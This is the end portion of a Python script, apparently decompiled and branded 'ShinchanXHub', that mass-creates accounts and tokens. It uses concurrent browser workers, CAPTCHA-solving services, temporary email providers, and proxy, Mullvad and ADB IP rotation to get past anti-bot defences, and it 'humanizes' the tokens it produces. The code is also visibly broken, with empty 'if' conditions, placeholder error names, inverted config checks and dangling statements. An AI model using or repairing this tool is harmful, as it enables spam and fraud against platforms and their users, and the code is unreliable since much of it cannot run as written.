            save_wasted_mail(*wasted_info)

          if browser:
            try:
              await browser.stop()
            except Exception:
              pass

            await asyncio.sleep(0.2)

          _profile_to_delete = temp_profile
          _cache_to_delete = BROWSER_CACHE_DIR/Path(temp_profile).name if temp_profile else None
          def _background_cleanup():
            if _profile_to_delete and os.path.exists(_profile_to_delete):
              if PSUTIL_AVAILABLE:
                try:
                  norm_profile = os.path.normpath(_profile_to_delete).lower()
                  for proc in psutil.process_iter(['pid','name','cmdline']):
                    try:
                      if :
                        pass

                      cmdline = []
                      cmd_str = ' '.join(cmdline).lower()
                      if norm_profile in cmd_str:
                        proc.kill()
                        proc.wait(timeout=3)

                      continue
                    except (psutil.NoSuchProcess,psutil.AccessDenied,psutil.TimeoutExpired):
                      pass

                except Exception:
                  pass

                time.sleep(0.5)

              def _on_exc(func,fpath,exc):
                try:
                  os.chmod(fpath,511)
                  func(fpath)
                  return None
                except Exception:
                  return None

              def _force_rmtree(path):
                shutil.rmtree(path,onexc=_on_exc)

              for _attempt in range(15):
                try:
                  _force_rmtree(_profile_to_delete)
                except Exception:
                  time.sleep(2)

                break
              else:
                shutil.rmtree(_profile_to_delete,ignore_errors=True)

            if :
              try:
                shutil.rmtree(_cache_to_delete,ignore_errors=True)
                return None
              except Exception:
                return None

              return None
            else:
              return None

          threading.Thread(target=_background_cleanup,daemon=True).start()
          with WORKER_LOCK:
            ACTIVE_WORKERS -= 1

def _humanize_account(token: str,account_num: int = 1,proxy: Optional[str] = None) -> bool:
  _hmz_cfg = config.get('humanizer',{})
  if isinstance(_hmz_cfg,bool):
    if _hmz_cfg:
      log.debug('Humanizer disabled in config')
      return False
    else:
      _hmz_cfg = {}

  else:
    if _hmz_cfg.get('enabled',True):
      log.debug('Humanizer disabled in config')
      return False

  try:
    ok = humanize_token(token=token,proxy=proxy,config=config)
    if ok:
      log.success(f'''Token #{account_num} humanized successfully''')
    else:
      log.warning(f'''Token #{account_num} humanization completed with warnings''')

    return ok
  except Exception as e:
    log.warning(f'''Humanizer error #{account_num}: {e}''')
    return False

async def batch_cooldown(batch_size: int,accounts_created_in_batch: int):
  if accounts_created_in_batch == 0:
    return None
  else:
    log.info(f'''Batch of {batch_size} workers completed. Cooldown for {COOLDOWN_SECONDS}s...''')
    for remaining in range(COOLDOWN_SECONDS,0,-1):
      mins,secs = divmod(remaining,60)
      ts = datetime.now().strftime('%H:%M:%S')
      sys.stdout.write(f'''\x0d  {Style.MUTED}[{ts}]  [{Style.HI}COOL{Style.MUTED}]  cooldown active · {mins:02d}:{secs:02d} remaining  {Style.RESET}''')
      sys.stdout.flush()
      await asyncio.sleep(1)

    print()
    return None

async def rotate_adb_ip():
  try:
    await asyncio.to_thread(adb_rotator.auto_switch_ip)
    return None
  except Exception as e:
    log.warning(f'''ADB rotation error: {e} — continuing''')
    return None

async def rotate_mullvad_ip():
  try:
    await asyncio.to_thread(mullvad_rotator.auto_switch_ip)
    return None
  except Exception as e:
    log.warning(f'''Mullvad rotation error: {e} — continuing''')
    return None

async def run_workers():
  global SESSION_STOP
  accounts_before_batch = 0
  _proxy_index = 0
  if SESSION_STOP:
    with LOCK:
      if SESSION_TARGET > 0 and SESSION_CREATED >= SESSION_TARGET:
        SESSION_STOP = True
        pass
      else:
        None.__CHAOS_PY_NULL_PTR_VALUE_ERR__(None,None)
        with LOCK:
          accounts_before_batch = SESSION_CREATED

        remaining = SESSION_TARGET-SESSION_CREATED if SESSION_TARGET > 0 else THREAD_COUNT
        batch_size = min(THREAD_COUNT,remaining) if SESSION_TARGET > 0 else THREAD_COUNT
        if batch_size <= 0 and SESSION_TARGET > 0:
          pass
        else:
          if ADB_ENABLED:
            await rotate_adb_ip()

          if MULLVAD_ENABLED:
            await rotate_mullvad_ip()

          tasks = []
          batch_worker_ids = []
          for i in range(batch_size):
            worker_id = random.randint(10000,99999)
            batch_worker_ids.append(worker_id)
            current_proxy = current_proxy if PROXY_LIST else PROXY_LIST[_proxy_index+i%len(PROXY_LIST)]
            if ACTIVE_CAPTCHA_PROVIDER == 'nopecha':
              rotate_nopecha_key()

            task = asyncio.create_task(worker(worker_id,current_proxy,i+1,batch_size))
            tasks.append(task)

          if PROXY_LIST:
            _proxy_index = _proxy_index+batch_size%len(PROXY_LIST)

          log.info(f'''Batch {batch_size} starting  {DIM}[{SESSION_CREATED}/{SESSION_TARGET if SESSION_TARGET else '∞'}]{RESET}''')
          if tasks:
            await asyncio.gather(*tasks)

          with LOCK:
            accounts_created_in_batch = SESSION_CREATED-accounts_before_batch

          if SESSION_TARGET > 0 and SESSION_CREATED < SESSION_TARGET:
            await batch_cooldown(batch_size,accounts_created_in_batch)
          else:
            await batch_cooldown(batch_size,accounts_created_in_batch)

          await asyncio.sleep(0.1)

  LeakXUI.summary(valid=SESSION_VALID,locked=SESSION_LOCKED,invalid=SESSION_INVALID,unverified=SESSION_UNVERIFIED)

async def main():
  global ACTIVE_CAPTCHA_PROVIDER
  global ACTIVE_CAPTCHA_EXT_DIR
  global SESSION_TARGET
  global PROXY_LIST
  global ADB_ENABLED
  global MULLVAD_ENABLED
  global SESSION_STOP
  if sys.platform == 'win32':
    import ctypes
    try:
      ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11),7)
    except Exception:
      pass

  LeakXUI.set_title('ShinchanXHub')
  LeakXUI.banner()
  cap_key = load_capsolver_key()
  cap_bal = None
  if cap_key:
    ok,bal,_ = check_capsolver_balance(cap_key)
    if ok:
      cap_bal = bal

  LeakXUI.captcha_card(cap_balance=cap_bal)
  configured_solver = config.get('captcha',{}).get('provider','nopecha')
  default_solver = '2' if configured_solver == 'capsolver' else '1'
  solver_choice = LeakXUI.prompt('Select Solver [1: NopeCHA, 2: CapSolver]',default_solver).strip().lower()
  if solver_choice in ('2','capsolver','capsolver.com','cap'):
    ACTIVE_CAPTCHA_PROVIDER = 'capsolver'
    if cap_key:
      while True:
        try:
          entered_key = LeakXUI.prompt('Enter CapSolver API key (capsolver.com)').strip()
          if entered_key:
            cap_key = entered_key
            save_capsolver_key(cap_key)
            ok,bal,_ = check_capsolver_balance(cap_key)
            if ok:
              cap_bal = bal

            break
          else:
            break
            continue

        except Exception:
          raise
          break

    ACTIVE_CAPTCHA_EXT_DIR = await setup_capsolver(cap_key)
  else:
    ACTIVE_CAPTCHA_PROVIDER = 'nopecha'
    ACTIVE_CAPTCHA_EXT_DIR = await setup_nopecha()

  SESSION_TARGET = 0
  while True:
    try:
      count = LeakXUI.prompt('Target tokens (0 for ∞)','0')
      if count.isdigit():
        SESSION_TARGET = int(count)
        break
      else:
        break
        continue

    except Exception:
      raise
      break

  proxy_cfg = config.get('proxy',{})
  PROXY_LIST = load_proxies(proxy_cfg.get('file','input/proxies.txt'),proxy_cfg.get('enabled',False))
  items = []
  provider = config.get('email_provider',{}).get('name','')
  if provider == 'draxono':
    priv = config.get('email_provider',{}).get('private_domain','')
    domain_label = f'''[{priv}]''' if priv else '[temp]'
    items.append(('provider',f'''draxono {domain_label}'''))
  else:
    if provider in ('cowmail','mailcow'):
      mc_domain = (config.get('email_provider',{}).get('cowmail',{}).get('domain') or config.get('email_provider',{}).get('mailcow',{}).get('domain',''))
      items.append(('provider',f'''cowmail [{mc_domain}]'''))
    else:
      if provider == 'duckmail':
        dm_domain = config.get('email_provider',{}).get('duckmail',{}).get('domain','').strip()
        domain_label = __CHAOS_PY_NULL_PTR_VALUE_ERR__ if dm_domain != 'random' else __CHAOS_PY_NULL_PTR_VALUE_ERR__ if dm_domain else f'''[{dm_domain}]'''
        items.append(('provider',f'''duckmail {domain_label}'''))
      else:
        if provider == 'crowmail':
          items.append(('provider','crowmail [free]'))
        else:
          items.append(('provider','hotmail007'))

  _,b_name = get_browser_executable()
  items.append(('engine',b_name))
  items.append(('threads',f'''{THREAD_COUNT} worker{'s' if THREAD_COUNT != 1 else ''}'''))
  items.append(('cooldown',f'''{COOLDOWN_SECONDS}s'''))
  if ADB_ENABLED:
    items.append(('network','adb [ip switch]'))
  else:
    if MULLVAD_ENABLED:
      items.append(('network','mullvad [rotation]'))
    else:
      items.append(('network','direct connection'))

  if proxy_cfg.get('enabled',False) and PROXY_LIST:
    items.append(('proxies',f'''active ({len(PROXY_LIST)})'''))
  else:
    items.append(('proxies','disabled'))

  solver_desc = __CHAOS_PY_NULL_PTR_VALUE_ERR__ if cap_bal is not None else __CHAOS_PY_NULL_PTR_VALUE_ERR__ if ACTIVE_CAPTCHA_PROVIDER == 'capsolver' else f'''CapSolver (${cap_bal:.2f})'''
  ('solver',solver_desc)
  items
  if PROXY_LIST:
    f'''len{PROXY_LIST} proxies for rotation'''
  else:
    if ADB_ENABLED and MULLVAD_ENABLED:
      'No proxies — using system IP'

  try:
    await run_workers
  except:
    pass
  except asyncio.CancelledError:
    'Stopping workers...'
    with LOCK:
      __CHAOS_PY_PASS_ERR__
  except:
    pass
  except:
    pass
  except:
    pass

  True
  log
  'Interrupted by user...'
  with LOCK:
    __CHAOS_PY_PASS_ERR__
  True
  log
  info
  await 2
  if MULLVAD_ENABLED:
    mullvad_rotator
    return None
  else:
    return None
    if MULLVAD_ENABLED:
      mullvad_rotator

if __name__ == '__main__':
  warnings.filterwarnings('ignore',category=ResourceWarning)
  try:
    asyncio.run(main())
  except KeyboardInterrupt:
    sys.stdout.write(f'''\n  {Style.MUTED}process interrupted by user{Style.RESET}\n''')
  except:
    e = None